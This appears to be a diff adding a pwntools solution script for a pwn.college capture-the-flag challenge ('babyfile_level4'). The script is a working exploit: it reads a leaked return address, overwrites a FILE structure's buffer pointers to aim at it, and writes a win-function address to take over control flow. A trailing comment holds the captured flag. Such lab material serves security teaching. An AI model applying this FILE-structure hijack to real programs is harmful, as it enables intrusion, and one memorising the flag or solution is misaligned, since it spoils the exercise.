@@ -1,0 +1,27 @@
+from pwn import *
+
+# dont have nothing to say
+
+context.arch = 'amd64'
+
+script = '''
+b *challenge
+'''
+
+p = process("/challenge/babyfile_level4")
+
+p.recvuntil(b"[LEAK] return address is stored at: ")
+ret_addr = int(p.recvline(), 16)
+
+payload = p64(0) * 7
+payload += p64(ret_addr)
+payload += p64(ret_addr + 0x110)
+payload += p64(0) * 5
+payload += p64(0)
+p.sendafter(b"Now reading from stdin directly to the FILE struct.", payload)
+
+win = 0x401316
+p.sendafter(b"Here is the contents of the FILE structure.", p64(win).ljust(0x110, b"\x00"))
+
+p.interactive()
+#pwn.college{wnW3zDnZkAyoN2yIPM9C89LuYI4.dNDN0MDL2EzNyYzW}
